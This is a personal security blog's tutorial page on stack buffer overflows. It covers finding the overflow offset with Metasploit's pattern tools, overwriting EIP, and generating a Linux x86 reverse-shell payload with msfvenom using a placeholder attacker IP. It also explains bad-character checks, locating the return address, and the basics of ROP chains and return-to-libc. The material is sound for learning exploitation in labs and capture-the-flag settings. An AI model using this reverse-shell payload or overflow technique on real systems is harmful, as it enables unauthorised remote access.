<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Notes Reverse BOF" /><meta name="author" content="BatBato" /><meta property="og:locale" content="en" /><meta name="description" content="Buffer Overflow" /><meta property="og:description" content="Buffer Overflow" /><link rel="canonical" href="nouman404.github.io/Notes/Reverse/BOF" /><meta property="og:url" content="nouman404.github.io/Notes/Reverse/BOF" /><meta property="og:site_name" content="BatBato’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-07T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes Reverse BOF" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BatBato" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BatBato"},"dateModified":"2023-02-05T17:48:36+01:00","datePublished":"2022-12-07T00:00:00+01:00","description":"Buffer Overflow","headline":"Notes Reverse BOF","mainEntityOfPage":{"@type":"WebPage","@id":"nouman404.github.io/Notes/Reverse/BOF"},"url":"nouman404.github.io/Notes/Reverse/BOF"}</script><title>Notes | Reverse | BOF | BatBato's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BatBato's Blog"><meta name="application-name" content="BatBato's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BatBato's Blog</a></div><div class="site-subtitle font-italic">BatBato was here :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Nouman404" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/235762" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Batbato" aria-label="tryhackme" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://www.root-me.org/BatBato" aria-label="rootme" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | Reverse | BOF</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | Reverse | BOF</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1670367600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 7, 2022 </em> </span> <span> Updated <em class="" data-ts="1675615716" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 5, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Bat </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1311 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h1 id="buffer-overflow">Buffer Overflow</h1><p>From here I’m assuming that you already know a bit about ASM (<code class="language-plaintext highlighter-rouge">mov</code>, <code class="language-plaintext highlighter-rouge">call</code>, <code class="language-plaintext highlighter-rouge">lea</code>…). If you don’t there is a good introduction in <a href="https://cloud.isi.insa-cvl.fr/s/qWmEqLkSGXnkLZn">here</a>.</p><p>So basically, the buffer overflow attack appears when you don’t pay attention to the user input and that he gives you a greater input than what you expected. This surplus will overwrite the memory.</p><p>We need to keep in mind the endianness of the system. If for example, we have a word <code class="language-plaintext highlighter-rouge">\xAA\xBB\xCC\xDD</code> at the address <code class="language-plaintext highlighter-rouge">0xffff0000</code>, then depending on the endianness the word will be read differently :</p><div class="table-wrapper"><table><thead><tr><th>Memory Address<th>0xffff0000<th>0xffff0001<th>0xffff0002<th>0xffff0003<tbody><tr><td>Big-Endian<td>AA<td>BB<td>CC<td>DD<tr><td>Little-Endian<td>DD<td>CC<td>BB<td>AA</table></div><p>What we would like to do is to give a greater input than the one expected so that we overwrite the return address of the program. Thanks to that, we will be able to call another function or something else in the memory. Here is an image that shows basically what we want to do :</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 100'%3E%3C/svg%3E" data-src="https://user-images.githubusercontent.com/73934639/206201166-ef62b19e-10da-4ae2-a3b5-d7139375b54f.png" alt="image" width="300" height="100" data-proofer-ignore></p><p>At first, we will try to find the main function and its address. For that, we can use gdb or radare2. I will continue this explanation using gdb syntax but it is basically the same on r2. We will run the program until we get to the input part, when we get there we can input a large number of <code class="language-plaintext highlighter-rouge">A</code> and if we inputed enought A, we should get a :</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Program received signal SIGSEGV, Segmentation fault.
0x41414141 <span class="k">in</span> ?? <span class="o">()</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">41</code> are the hexadecimal value of <code class="language-plaintext highlighter-rouge">A</code>. Now that we know that we overwrote the return address we need to find how much <code class="language-plaintext highlighter-rouge">A</code> we need to input before getting a segmentation fault. We can use the <code class="language-plaintext highlighter-rouge">pattern_offset</code> tool of <code class="language-plaintext highlighter-rouge">metasploit</code> to generate a random string of certain length so we don’t have a bunch of <code class="language-plaintext highlighter-rouge">41</code> in the memory. We can use it as follows:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pattern_create.rb <span class="nt">-l</span> 1200
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>This program should be in the <code class="language-plaintext highlighter-rouge">metasploit-framework</code> folder. On my computer it is located at <code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</code>.</p></div></blockquote><p>We can use the gdb command to find the address of <code class="language-plaintext highlighter-rouge">EIP</code> (respectively <code class="language-plaintext highlighter-rouge">RIP</code> depending on the architecture) :</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>info registers eip
</pre></table></code></div></div><p>With this information you can use the metasploit <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code> tool to find the exact offset. Or if you are good in ASM you can look what is the length of the word you give in input. You can use the tool as follows (where 0xaabbccdd is the value storred in EIP that you found earlier): <code class="language-plaintext highlighter-rouge">pattern_offset.rb -q 0xaabbccdd</code></p><blockquote class="prompt-info"><div><p>You can find <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code> in <code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb</code>.</p></div></blockquote><p>We will assume that we have an offset of 64 for the rest of the demonstration. Now we can run the program again with the offset length as input and 4 bytes of “B”s. 4 is the size of the return address (here in 32 bi ELF). Here is an example:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s2">"A"</span> <span class="k">*</span> 64 + <span class="s2">"B"</span><span class="k">*</span>4
</pre></table></code></div></div><p>You can use this python command to generate your strings:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python2 <span class="nt">-c</span> <span class="s2">"print 'A' * 64 + 'B' * 4"</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>This command only works in python2. You can use the following command in python3 : <code class="language-plaintext highlighter-rouge">python3 -c "print('A' * 64 + 'B' * 4)"</code></p></div></blockquote><blockquote class="prompt-warning"><div><p>You may need <code class="language-plaintext highlighter-rouge">gdb-peda</code> for this kind of command. You can find it <a href="https://www.kali.org/tools/gdb-peda/">here</a> or <a href="https://github.com/longld/peda">here</a></p></div></blockquote><p>With this input we should only have the 4 “B”s as EIP address like:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
</pre></table></code></div></div><p>For this first part of BOF, we will use <a href="https://www.kali.org/tools/metasploit-framework/#msfvenom">msfvenom</a>. To create a reverse shell payload, we can use the following command:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">lport</span><span class="o">=</span>PORT <span class="nt">--platform</span> linux <span class="nt">--arch</span> x86 <span class="nt">--format</span> python
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Don’t forget to replace <code class="language-plaintext highlighter-rouge">IP</code> with yours. Same for the <code class="language-plaintext highlighter-rouge">PORT</code>.</p></div></blockquote><p>Now if this is too long you can change it to a simple shell instead of a reverse one. The composition of our final payload will be:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">10</span> <span class="o">-</span> <span class="mi">40</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">NOPs</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">10</span>
<span class="n">Shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">40</span>
<span class="n">EIP</span> <span class="o">=</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p><code class="language-plaintext highlighter-rouge">\x90</code> is the hexadecimal value of the <code class="language-plaintext highlighter-rouge">NOP</code> instruction.</p></div></blockquote><h2 id="bad-characters"><span class="mr-2">Bad Characters</span><a href="#bad-characters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Your payload may not work because of some <code class="language-plaintext highlighter-rouge">Bad Characters</code>. They are generaly <code class="language-plaintext highlighter-rouge">\x00</code> (Null byte),<code class="language-plaintext highlighter-rouge">\x0A</code> (Line Feed),<code class="language-plaintext highlighter-rouge">\x0D</code> (Carriage Return),<code class="language-plaintext highlighter-rouge">\xFF</code> (Form Feed).</p><p>Here is the list of all chars from <code class="language-plaintext highlighter-rouge">\x00</code> to <code class="language-plaintext highlighter-rouge">\xFF</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="sh">"</span><span class="se">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="sh">"</span>
</pre></table></code></div></div><p>You can remove the NOPs and the shellcode from the previous payload and replace them by this list. If the list is too long (256 chars) you can do it multiple time with different parts of the list. Now you can set a breakpoint just after the input so that we can analyse the memory. When the program hits the breakpoint, we can look at the <code class="language-plaintext highlighter-rouge">EIP</code> like that <code class="language-plaintext highlighter-rouge">x/2000xb $esp+500</code>. We will see a bunch of <code class="language-plaintext highlighter-rouge">0x43</code> (our “C”s). At the end of our “C”s we should see the characters of our previous list. If a character isn’t printed out, it means that it is a bad character. You can repeat those steps until you removed all the bad characters.</p><blockquote class="prompt-warning"><div><p>Don’t forget to change the number of “C”s when you remove a bad character from the list. The number of “C”s should increase by one each time you remove a bad character.</p></div></blockquote><p>You can now use the previous <code class="language-plaintext highlighter-rouge">msfvenom</code> command specifying all bad characters:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>IP <span class="nv">lport</span><span class="o">=</span>PORT  <span class="nt">--arch</span> x86 <span class="nt">--platform</span> linux <span class="nt">--format</span> python <span class="nt">--bad-chars</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">0a"</span>
</pre></table></code></div></div><h2 id="identification-of-the-return-address"><span class="mr-2">Identification of the Return Address</span><a href="#identification-of-the-return-address" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we should replace our 4 “B”s by the address of our shellcode. For that we need to analyse the memory. We can do so like:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x/2000xb <span class="nv">$esp</span>+1400
</pre></table></code></div></div><p>We will see where our NOPs (<code class="language-plaintext highlighter-rouge">0x90</code>) end and where our shellcode begins. For example, if the NOPs end at <code class="language-plaintext highlighter-rouge">0xffffaabb</code>, then we will replace our 4 “B”s by <code class="language-plaintext highlighter-rouge">\xbb\xaa\xff\xff</code>. To be more accurate we can choose an address that is full of NOP a bit before <code class="language-plaintext highlighter-rouge">0xffffaabb</code>like <code class="language-plaintext highlighter-rouge">0xffffaaaa</code> for example.</p><h1 id="rop-chain-attack">ROP chain attack</h1><p>A ROP (Return-Oriented Programming) chain is a technique used in exploitation of memory safety vulnerabilities, where an attacker controls the flow of execution by chaining together small code snippets (gadgets) found within the program itself or its libraries.</p><p>The attacker constructs a ROP chain by overwriting the return address of a function with the address of a ROP gadget, which performs some actions (such as setting up a register or stack) before returning to the next gadget in the chain. The attacker repeats this process until the final gadget transfers control to the attacker’s payload (such as executing shellcode).</p><p>You can find <a href="https://github.com/Nouman404/nouman404.github.io/blob/main/_posts/Notes/Reverse/exploit.py">here</a> a code for a basic <code class="language-plaintext highlighter-rouge">ROP chain attack</code>. As you can see, I used as offset <code class="language-plaintext highlighter-rouge">0x40+4</code>. The <code class="language-plaintext highlighter-rouge">0x40</code> can be found in the code using <code class="language-plaintext highlighter-rouge">gdb</code> here <code class="language-plaintext highlighter-rouge">add esp,0x4</code> and the <code class="language-plaintext highlighter-rouge">+4</code> is because of the file is a <code class="language-plaintext highlighter-rouge">ELF 32-bit</code> format.</p><blockquote class="prompt-tip"><div><p>To know if the file is either a 32 or 64 bit ELF executable you can use the <code class="language-plaintext highlighter-rouge">file</code> Linux command like:<code class="language-plaintext highlighter-rouge">file VULN_EXECUTABLE</code></p></div></blockquote><p>You can find the <code class="language-plaintext highlighter-rouge">system</code> call and the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> by using the search command like <code class="language-plaintext highlighter-rouge">search /bin/sh</code> or by using <code class="language-plaintext highlighter-rouge">info proc mapping</code> to print the range of addresses of your program and the libc. After using the <code class="language-plaintext highlighter-rouge">info proc mapping</code>, you can use the find command as follows <code class="language-plaintext highlighter-rouge">find 0xf7c00000, 0xf7e22000, "/bin/sh"</code>. The two addresses you see are the range of addresses where we want to search the <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p><blockquote class="prompt-tip"><div><p>It may be better to look only on addresses of the program and after that, only on the libc addresses. Searching in both range of addresses may cause errors.</p></div></blockquote><blockquote class="prompt-tip"><div><p>You may need to use <code class="language-plaintext highlighter-rouge">return to libc</code> to recover those addresses if the program uses <code class="language-plaintext highlighter-rouge">Data Execution Prevention</code> (DEP) and <code class="language-plaintext highlighter-rouge">Address Space Layout Randomization</code> (ASLR).</p></div></blockquote><p>You can also look at this really great <a href="https://www.youtube.com/watch?v=i5-cWI_HV8o">video</a> of John Hammond about ROP chain attack. He explains more in detail how to use the <code class="language-plaintext highlighter-rouge">return to libc</code>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/reverse/'>Reverse</a>, <a href='/categories/bof/'>BOF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/reverse/" class="post-tag no-text-decoration" >Reverse</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >BOF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+Reverse+%7C+BOF+-+BatBato%27s+Blog&url=nouman404.github.io%2FNotes%2FReverse%2FBOF" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+Reverse+%7C+BOF+-+BatBato%27s+Blog&u=nouman404.github.io%2FNotes%2FReverse%2FBOF" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=nouman404.github.io%2FNotes%2FReverse%2FBOF&text=Notes+%7C+Reverse+%7C+BOF+-+BatBato%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Notes/AD/AD_Basics">Notes | AD | AD Basics</a><li><a href="/Notes/AD/Tools">Notes | AD | AD Tools</a><li><a href="/CTFs/HeroCTF_2024/Steganographie/Zipper">CTFs | HeroCTF_2024 | Steganographie | Zipper</a><li><a href="/CTFs/HeroCTF_2024/Forensique/LazySysAdmin2">CTFs | HeroCTF_2024 | Forensique | LazySysAdmin2</a><li><a href="/CTFs/HeroCTF_2024/Forensique/Tenant_trouble">CTFs | HeroCTF_2024 | Forensique | Tenant trouble</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/CTFs/404_CTF_2024/Retro/Bugdroid_Fight"><div class="card-body"> <em class="small" data-ts="1713996000" data-df="ll" > Apr 25, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2024 | Retro | Bugdroid Fight</h3><div class="text-muted small"><p> Bugdroid Fight Here, we have the following apk. First I converted the apk into a JAR file using the following command: 1 ./dex-tools-v2.4/d2j-dex2jar.sh Bugdroid_Fight_-_Part_1.apk The de...</p></div></div></a></div><div class="card"> <a href="/CTFs/404_CTF_2024/Retro/Echauffement"><div class="card-body"> <em class="small" data-ts="1713996000" data-df="ll" > Apr 25, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2024 | Retro | Echauffement</h3><div class="text-muted small"><p> Echauffement In this challenge, we are given the echauffement.bin file. We open it using ghidra and we see the following code in the main function: As we can see, the secret_function_dont_loo...</p></div></div></a></div><div class="card"> <a href="/CTFs/404_CTF_2024/Retro/Intronisation_du_CHAUSSURE"><div class="card-body"> <em class="small" data-ts="1713996000" data-df="ll" > Apr 25, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2024 | Retro | Intronisation du CHAUSSURE</h3><div class="text-muted small"><p> Intronisation du CHAUSSURE The binary is available here. In the main function we see the following code: We notice the password split character by character and the order is the order of vari...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/CTFs/HackDay/Stegano/J_ai_perdu_le_flag_English" class="btn btn-outline-primary" prompt="Older"><p>CTFs | HackDay | J'ai perdu le flag English</p></a> <a href="/CTFs/Hackday2023/Misc/Pas_Trop_Dur" class="btn btn-outline-primary" prompt="Newer"><p>CTFs | HackDay2023 | Pas_Trop_Dur</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Nouman404/">Bat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" 